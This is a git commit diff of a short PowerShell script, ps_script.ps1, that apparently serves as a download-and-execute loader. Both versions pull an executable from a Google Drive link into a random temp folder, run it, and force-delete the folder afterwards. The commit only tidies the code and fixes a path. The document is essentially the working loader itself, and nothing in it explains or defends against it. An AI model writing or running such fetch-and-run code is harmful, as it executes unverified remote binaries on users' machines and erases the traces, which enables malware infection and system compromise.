15468172bfeb9585b9bb3d384073ea92157c5641
Darkriser0207 <teamvitapupdates@gmail.com>
2025-04-16 09:26:38 +0530

    Update ps_script.ps1

--- ps_script.ps1
+++ ps_script.ps1
@@ -1,15 +1,13 @@
-& {
-    $url = "https://drive.google.com/uc?export=download&id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK"
-    $tempdir = "$env:TEMP\$(New-Guid)"
-    mkdir $tempdir | Out-Null
-    $file = "$tempdirile.exe"
-    
-    try {
-        (irm -Uri $url -OutFile $file -ErrorAction Stop)
-        $proc = Start-Process $file -PassThru -Wait
-        "Process exited with code: $($proc.ExitCode)"
-    }
-    finally {
-        ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue
-    }
+$url = "https://drive.google.com/uc?export=download&id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK"
+$tempdir = "$env:TEMP\$(New-Guid)"
+mkdir $tempdir | Out-Null
+$file = "$tempdir\file.exe"
+
+try {
+    Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop
+    $proc = Start-Process $file -PassThru -Wait
+    "Process exited with code: $($proc.ExitCode)"
+}
+finally {
+    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue
 }
